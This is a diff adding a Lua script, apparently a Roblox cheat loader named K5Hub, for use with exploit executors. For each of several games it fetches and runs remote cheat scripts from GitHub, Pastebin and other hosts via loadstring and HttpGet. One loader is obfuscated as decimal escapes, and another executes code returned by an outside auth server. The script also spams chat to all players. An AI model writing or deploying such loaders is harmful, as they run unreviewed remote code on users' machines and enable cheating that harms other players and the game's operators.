@@ -1,0 +1,163 @@
+--[[ Games ]]--                                                                                                                                                                                                        
+                                                                                                                                                                                                                                                                                                                                                             local SayMSG = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
+----------------------------------------------------------------------------------\
+local JustBaseplate                                                = 4483381587 --|
+local MM2                                                          = 142823291  --|
+local Brookhaven                                                   = 4924922222 --|
+local Bedwars                                                      = 6872265039 --|
+local DaHood                                                       = 2788229376 --|
+local JustGrass                                                    = 5100950559 --|
+local PetSimX                                                      = 6284583030 --|
+local BuildABoat                                                   = 537413528  --| 
+----------------------------------------------------------------------------------/
+
+--[[
+
+██   ██ ███████ ██   ██ ██    ██ ██████  
+██  ██  ██      ██   ██ ██    ██ ██   ██ 
+█████   ███████ ███████ ██    ██ ██████  
+██  ██       ██ ██   ██ ██    ██ ██   ██ 
+██   ██ ███████ ██   ██  ██████  ██████
+                                        
+
+                                                                                                      (on https://discord.com if ur dumb)
+███    ███  █████  ██████  ███████     ██████  ██    ██     ██     ██████  ███████ ██    ██          ██  ██  ███████ ██████   ██████   ██ 
+████  ████ ██   ██ ██   ██ ██          ██   ██  ██  ██      ██     ██   ██ ██      ██    ██         ████████ ██           ██ ██  ████ ███ 
+██ ████ ██ ███████ ██   ██ █████       ██████    ████       ██     ██   ██ █████   ██    ██          ██  ██  ███████  █████  ██ ██ ██  ██ 
+██  ██  ██ ██   ██ ██   ██ ██          ██   ██    ██               ██   ██ ██       ██  ██          ████████      ██ ██      ████  ██  ██ 
+██      ██ ██   ██ ██████  ███████     ██████     ██        ██     ██████  ███████   ████   ███████  ██  ██  ███████ ███████  ██████   ██ 
+
+]]--
+--[[ Script ]]--
+
+local active = true
+----------------------------
+-- Controls if the script should work or not.
+----------------------------
+-- true = Enable
+-- false = Disable
+----------------------------
+
+if active == true then
+
+ SayMSG:FireServer("[K5Hub] Loaded script, Version is V2.1" ,"All")
+
+
+ if game.PlaceId == JustBaseplate then
+ SayMSG:FireServer("[K5Hub] Detected that game is: 'a literal baseplate', Loading scripts.." ,"All")
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
+ wait(2.5)
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
+ end
+ --
+ if game.PlaceId == MM2 then
+ SayMSG:FireServer("[K5Hub] Detected that game is: 'Murder Mystery 2', Loading scripts.." ,"All")
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))
+ wait(2.5)
+ --
+ getgenv().mainKey = "nil"
+
+ local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+ --
+ wait(2.5)
+ loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
+ wait(2.5)
+ loadstring(game:HttpGet("https://pastebin.com/raw/SjCTiBVc", true))()
+ end
+ --
+ if game.PlaceId == Brookhaven then
+ SayMSG:FireServer("[K5Hub] Detected that game is: 'Brookhaven RP', Loading scripts.." ,"All")
+ loadstring(game:HttpGet('https://raw.githubusercontent.com/topitbopit/rblx/main/jeff_gui.lua', true))()
+ wait(2.5)
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
+ wait(2.5)
+ loadstring(game:HttpGet("https://pastebin.com/raw/iL4NRDux", true))()
+ end
+ --
+
+ if game.PlaceId == Bedwars then
+ SayMSG:FireServer("[K5Hub] Detected that game is: 'Bedwars', Loading scripts.." ,"All")
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
+ end
+ --
+ if game.PlaceId == DaHood then
+ SayMSG:FireServer("[K5Hub] Detected that game is: 'Da Hood', Loading scripts.." ,"All")
+ loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\99\121\112\104\101\114\100\104\47\83\101\114\101\110\105\116\121\47\109\97\105\110\47\115\99\114\105\112\116\34\41\41\40\41\10")("SERENITY > ALL")
+ wait(2.5)
+ loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
+ wait(2.5)
+ loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/PolarWasHere/Arctic/main/Arctic"))()
+ wait(2.5)
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/FarmyScript/Dahood-GUI-/main/README.md"))()
+ end
+ --
+ if game.PlaceId == JustGrass then
+ SayMSG:FireServer("[K5Hub] Detected that game is: 'Just Grass', Loading scripts.." ,"All")
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
+ wait(2.5)
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
+ wait(2.5)
+ loadstring(game:HttpGet("https://pastebin.com/raw/C05QhJRv", true))()
+ end
+ --
+ if game.PlaceId == PetSimX then
+ SayMSG:FireServer("[K5Hub] Detected that game is: 'Pet Simulator X', Loading scripts.." ,"All")
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/TurfuGoldy/GoldenScripts/main/EzPets.lua", true))()
+ wait(2.5)
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/si1nnx/psxx/main/g"))()
+ wait(2.5)
+ loadstring(game:HttpGet("https://www.scriptblox.com/raw/SAZA-HUB_496"))()
+ wait(2.5)
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/Wind596/VoidHub/main/WiningDediy", true))()
+ wait(2.5)
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/XLinestX/Shiny-Tool/main/iris.lua"))()
+ end
+ --
+ if game.PlaceId == BuildABoat then
+ SayMSG:FireServer("[K5Hub] Detected that game is: 'Build A Boat For Treasure', Loading scripts.." ,"All")
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Build%20A%20Boat%20For%20Treasure/BABFT"))()
+ wait(2.5)
+ loadstring(game:HttpGet("https://pastebin.com/raw/6WxFn4xj"))()
+ end
+ --
+ SayMSG:FireServer("[K5Hub] 'Exploiters always have a valk in brookhaven..' " ,"All")
+ wait(2.9)
+ print("Changelogs: Fixed the script not working")
+ --
+end
+--
+
+if active == false then
+    SayMSG:FireServer("[K5Hub] Script is disabled." ,"All")
+end
+--
+
+
+
+
+
+
+
+
+
+
+if identifyexecutor() == "Krnl" then
+print("[K5Hub] You're using KRNL.")
+end
+--
+if identifyexecutor() == "Synapse" then
+print("[K5Hub] You're using Synapse, great job on buying synapse!")
+end
+--
+if identifyexecutor() == "Fluxus" then
+print("[K5Hub] You're using Fluxus.")
+end
+--
+if identifyexecutor() == "Kato" then
+print("[K5Hub] You're using a executor with Kato.")
+end
+--
+if identifyexecutor() == "Evon" then
+print("[K5Hub] You're using Evon.")
+end
+--
